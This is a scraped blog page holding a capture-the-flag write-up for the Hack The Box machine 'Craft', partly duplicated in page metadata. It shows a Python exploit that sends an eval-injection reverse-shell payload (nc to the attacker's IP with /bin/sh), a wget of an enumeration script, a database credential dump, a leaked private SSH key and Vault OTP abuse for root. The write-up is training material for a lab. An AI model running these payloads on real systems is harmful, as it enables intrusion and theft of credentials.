Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jan 4 12:04:33 2020 from 10.10.XX.XX gilfoyle@craft:~$ cat user.txt bbf4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In gilfoyle’s private repository, there was a folder called vault. Thinking it was a name for a service, I went to search online and found this. 1 A tool for secrets management, encryption as a service, and privileged access management. In the folder, I found a script at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh 1 2 3 4 5 6 7 8 9 10 #!/bin/bash # set up vault secrets backend vault secrets enable ssh vault write ssh/roles/root_otp \ key_type=otp \ default_user=root \ cidr_list=0.0.0.0/0 Hmm… Seem like vault is being used to store ssh keys or something? Time to look at the documentation. root.txt The commands looked pretty similar. Following the Automate it section, all we have to do is create a new OTP and ssh into the box. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 vault ssh -role root_otp -mode otp root@127.0.0.1 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed below. Enter this code in the SSH password prompt. If you install sshpass, Vault can automatically perform this step for you. OTP for the session is: f80f58e4-6ec7-dcdf-b491-f2ee66a89260 . * .. . * * * * @()Ooc()* o . (Q@*0CG*O() ___ |\_________/|/ _ \ | | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | \_| | | | | | |\___/ |\_|__|__|_/| \_________/ Password: The password is simply just the OTP generated for the session, which is f80f58e4-6ec7-dcdf-b491-f2ee66a89260. 1 2 3 4 5 6 7 8 9 10 11 12 Password: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 27 04:53:14 2019 root@craft:~# cat root.txt 831dXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/craft-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/craft-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-01-05T02:08:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Craft" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/craft-htb/"},"description":"My first Medium box! Didn’t think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought “why not”? Of course, I needed the help of the forums to guide me :P Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.110 craft.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC craft.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 00:11 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 59.20% done; ETC: 00:11 (0:00:08 remaining) Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 91.94% done; ETC: 00:12 (0:00:00 remaining) Nmap scan report for craft.htb (10.10.10.110) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.33 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the https service, maybe we can find some information on it ? Nothing much here except for the API and the git icon on the top right. Lets first check out the API. It was a link to https://api.craft.htb/api/, hence we had to add api.craft.htb to our /etc/hosts for the page to be resolved properly. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb After playing around with some of the different APIs, what caught my attention was /auth/login. Upon clicking on Execute, I was prompted for credentials. Since I did not have any credentials, I decided to put this on hold for now. Lets move on the git icon. It was a link to https://gogs.craft.htb, hence we need to modify our /etc/hosts again. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb gogs.craft.htb So this website is like a private github of some sort? By clicking on Explore, we are able to list all the public repositories, users and organisations on the website. Oh we found something! There is a repository that might be related to https://api.craft.htb/api! This repository seems to contain the source code. Lets try looking around. There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials! Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to https://api.craft.htb/api/ and key them into the prompt for the /auth/login feature. We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites. Exploitation (1) On https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py, there was a certain section that caught my eye. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @ns.route(&#39;/&#39;) class BrewCollection(Resource): ... @auth.auth_required @api.expect(beer_entry) def post(self): &quot;&quot;&quot; Creates a new brew entry. &quot;&quot;&quot; # make sure the ABV value is sane. if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]): return &quot;ABV must be a decimal value less than 1.0&quot;, 400 else: create_brew(request.json) return None, 201 eval was being called with input from the abv field in the sent JSON for the /brew/ route. This means that whatever python expression we enter in the abv field, it will be executed. Hm… I decided to search for how to achieve reverse shell from the eval function and I found this post on StackOverflow. When &quot;__import__(&#39;os&#39;).system(&#39;nc 10.10.XX.XX -e /bin/sh&#39;)&quot; is inputted into eval, it will cause the box to connect back to us. I used the below python script to assist in the sending of the payload. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import requests authtoken = requests.get(&#39;https://api.craft.htb/api/auth/login&#39;, auth=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;), verify=False).json()[&quot;token&quot;] exploit = { &#39;abv&#39;:&quot;__import__(\\&#39;os\\&#39;).system(\\&#39;nc 10.10.XX.XX 1337 -e /bin/sh\\&#39;)&quot;, &quot;brewer&quot;: &quot;string&quot;, &quot;name&quot;: &quot;string&quot;, &quot;style&quot;: &quot;string&quot;, } headers = {&#39;X-Craft-Api-Token&#39;: authtoken} print(requests.post(&#39;https://api.craft.htb/api/brew/&#39;, json=exploit, headers=headers, verify=False).content) With the script ready, we start our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root? 1 2 3 4 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.110] 46345 id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) There was no root.txt at /root, so what is going on? Enumeration (2) Lets try running LinEnum to get some insights. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wget http://10.10.XX.XX/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh ... [+] Looks like we&#39;re in a Docker container: 10:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 9:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 8:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 7:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 6:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 5:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 4:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 3:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c -rwxr-xr-x 1 root root 0 Feb 10 2019 /.dockerenv Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P Looking back at the repository on https://gogs.craft.htb, there was a .gitignore. 1 2 *.pyc settings.py The settings.py seemed interesting. It was located at /opt/app/craft_api and it contained a lot of juicy information. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Flask settings FLASK_SERVER_NAME = &#39;api.craft.htb&#39; FLASK_DEBUG = False # Do not use debug mode in production # Flask-Restplus settings RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &#39;list&#39; RESTPLUS_VALIDATE = True RESTPLUS_MASK_SWAGGER = False RESTPLUS_ERROR_404_HELP = False CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39; # database MYSQL_DATABASE_USER = &#39;craft&#39; MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39; MYSQL_DATABASE_DB = &#39;craft&#39; MYSQL_DATABASE_HOST = &#39;db&#39; SQLALCHEMY_TRACK_MODIFICATIONS = False Nice we got the credentials for a mysql database service running on the box. According to the model schema found at https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py, there is a User table containing usernames and passwords. We can modify this database testing script at https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py to dump out the table. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!/usr/bin/env python import pymysql from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = &quot;SELECT `id`, `username`, `password` FROM `user`&quot; cursor.execute(sql) result = cursor.fetchall() for creds in result: print(creds) finally: connection.close() Running the script gave us more credentials! 1 2 3 4 python dbtest_new.py {&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;} {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;} {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;} Lets try logging in to https://gogs.craft.htb using these credentials. Only dinesh’s and gilfoyle’s credentials worked. However, in gilfoyle’s homepage I noticed another repository but was private. Looking through the repository, I found a ssh key pair at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa user.txt I downloaded the id_rsa, which is the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi 4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ 3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5 0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F 5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5 elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz 6YvpJhnN2SfJC/QftzqZK2MndJrmQ= -----END OPENSSH PRIVATE KEY----- I attempted to ssh to the box. The passphrase was ZEU3N8WNM2rh4T, which was gilfoyle’s password. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ chmod 600 id_rsa $ ssh -i id_rsa gilfoyle@craft.htb Enter passphrase for key &#39;id_rsa&#39;: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jan 4 12:04:33 2020 from 10.10.XX.XX gilfoyle@craft:~$ cat user.txt bbf4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In gilfoyle’s private repository, there was a folder called vault. Thinking it was a name for a service, I went to search online and found this. 1 A tool for secrets management, encryption as a service, and privileged access management. In the folder, I found a script at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh 1 2 3 4 5 6 7 8 9 10 #!/bin/bash # set up vault secrets backend vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=0.0.0.0/0 Hmm… Seem like vault is being used to store ssh keys or something? Time to look at the documentation. root.txt The commands looked pretty similar. Following the Automate it section, all we have to do is create a new OTP and ssh into the box. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 vault ssh -role root_otp -mode otp root@127.0.0.1 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed below. Enter this code in the SSH password prompt. If you install sshpass, Vault can automatically perform this step for you. OTP for the session is: f80f58e4-6ec7-dcdf-b491-f2ee66a89260 . * .. . * * * * @()Ooc()* o . (Q@*0CG*O() ___ |\\_________/|/ _ \\ | | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | \\_| | | | | | |\\___/ |\\_|__|__|_/| \\_________/ Password: The password is simply just the OTP generated for the session, which is f80f58e4-6ec7-dcdf-b491-f2ee66a89260. 1 2 3 4 5 6 7 8 9 10 11 12 Password: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 27 04:53:14 2019 root@craft:~# cat root.txt 831dXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/craft-htb/","@type":"BlogPosting","headline":"Hack The Box - Craft","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-01-05T02:08:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Craft | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Craft</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Craft</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 5, 2020, 2:08 AM +0800" > Jan 5, 2020 <i class="unloaded">2020-01-05T02:08:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1845 words">10 min</span></div></div><div class="post-content"><p>My first <code class="language-plaintext highlighter-rouge">Medium</code> box! Didn’t think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought “why not”? Of course, I needed the help of the forums to guide me :P</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.110 craft.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> craft.htb
